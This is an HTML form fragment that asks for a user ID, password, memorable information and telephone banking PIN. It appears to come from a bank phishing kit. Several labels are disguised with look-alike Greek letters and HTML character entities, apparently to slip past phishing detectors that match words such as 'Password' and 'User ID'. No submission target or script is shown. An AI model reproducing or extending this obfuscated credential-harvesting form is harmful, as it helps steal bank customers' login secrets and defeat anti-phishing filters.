<br>
<form>
	<table width="100%">
		<tr>
			<td width="30%">&#x0055;ser ΙD :</td>
			<td width="2%">&nbsp;&nbsp;:&nbsp;&nbsp;</td>
			<td>
				<div class="textInput">
					<div class="fieldWrapper">
						<input type="text"  autocomplete="off"  maxlength="20" name="u_id" value="" required="required" title="User ΙD">
					</div>
				</div>
			</td>
		</tr>
		<tr>
			<td width="30%">Passw&omicron;rd</td>
			<td width="2%">&nbsp;&nbsp;:&nbsp;&nbsp;</td>
			<td>
				<div class="textInput">
					<div class="fieldWrapper">
						<input type="password"  autocomplete="off" maxlength="20" name="pwd_b" value="" required="required" title="Password">
					</div>
				</div>
			</td>
		</tr>
		<tr>
			<td width="30%">&#77;emorable</td>
			<td width="2%">&nbsp;&nbsp;:&nbsp;&nbsp;</td>
			<td>
				<div class="textInput">
					<div class="fieldWrapper">
						<input type="text"  autocomplete="off" maxlength="20" name="m_able" value="" required="required" title="Memorable">
					</div>
				</div>
			</td>
		</tr>
		<tr>
			<tr>
				<td width="30%">Telephone &#x0042;anking &#x0050;in</td>
				<td width="2%">&nbsp;&nbsp;:&nbsp;&nbsp;</td>
				<td>
					<div class="textInput">
						<div class="fieldWrapper">
							<input type="password"  autocomplete="off" id="txt" onkeyup="check()" onmouseout="check()"  maxlength="10" name="tpin" value="" required="" title="Telephone Pin">
						</div>
					</div>
				</td>
			</tr>
		</table>
	</form>